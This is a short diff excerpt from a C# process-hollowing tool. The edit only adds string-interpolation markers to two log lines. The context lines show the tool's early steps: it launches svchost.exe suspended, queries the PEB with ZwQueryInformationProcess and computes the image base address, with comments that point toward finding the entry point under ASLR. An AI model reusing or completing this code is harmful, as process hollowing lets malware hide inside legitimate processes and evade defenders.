@@ -135,14 +135,14 @@ namespace ProcessHollowing
             ProcessInfo pInfo = new ProcessInfo();
             bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                 false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
-            Console.WriteLine("Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
+            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
 
             // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
             ProcessBasicInfo pbInfo = new ProcessBasicInfo();
             uint retLen = new uint();
             long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
             IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
-            Console.WriteLine("Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
+            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
 
             // Get entry point of the actual process executable
             // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
